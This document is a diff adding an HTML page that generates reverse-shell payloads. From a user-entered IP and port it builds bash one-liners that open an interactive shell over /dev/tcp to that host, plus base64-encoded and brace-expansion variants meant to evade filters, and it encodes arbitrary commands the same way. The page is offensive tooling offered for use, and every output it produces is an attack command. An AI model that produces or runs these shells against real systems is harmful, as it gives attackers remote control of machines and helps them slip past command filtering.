@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>bash</title>
+	<meta charset="utf-8">
+</head>
+<body>
+<center>
+	<h4>反弹shell</h4><br>
+    ip:<input type="text" value="1.2.3.4" id="host" onkeyup="getresult()">
+    port:<input type="text" value="8080" id="port" onkeyup="getresult()">
+    <br><br>
+	<div id="result"></div>
+    <br><br>
+    <h4>命令执行</h4><br>
+    command:<input type="text" value="ifconfig" id="cmd" onkeyup="getresult()">
+    <br><br>
+	<div id="result1"></div>
+</center>
+<script>
+function getresult(){
+	var host = document.getElementById('host').value;
+    var port = document.getElementById('port').value;
+	var result = document.getElementById('result');
+    var bash1 = "bash -c 'exec bash -i &>/dev/tcp/" + host + "/" +port + "<&1'";
+    var bash2 = "bash -i >& /dev/tcp/" + host + "/" +port + " 0>&1"
+    var bash5 = 'echo ' + btoa(bash1) + '|base64 -d|bash -i';
+    var bash6 = 'echo ' + btoa(bash2) + '|base64 -d|bash -i';
+	var bash3 = 'bash -c {echo,' + btoa(bash1) + '}|{base64,-d}|{bash,-i}';
+    var bash4 = 'bash -c {echo,' + btoa(bash2) + '}|{base64,-d}|{bash,-i}';
+	var htmlContent = bash1 + "</br>" + bash2 + "</br>" +bash5+"</br>" +bash6+"</br>" +bash4 + "</br>" +  bash3 + "</br>";
+	result.innerHTML = htmlContent;
+}
+
+function getresult1(){
+	var cmd = document.getElementById('cmd').value;
+	var result = document.getElementById('result1');
+    var bash1 = 'echo ' + btoa(cmd) + '|base64 -d|bash -i';
+	var bash2 = 'bash -c {echo,' + btoa(cmd) + '}|{base64,-d}|{bash,-i}';
+	var htmlContent = bash1 + "</br>" + bash2 + "</br>";
+	result.innerHTML = htmlContent;
+}
+</script>
+<script type="text/javascript"> window.onload = function(){  getresult(); getresult1(); } </script>
+</body>
+</html>
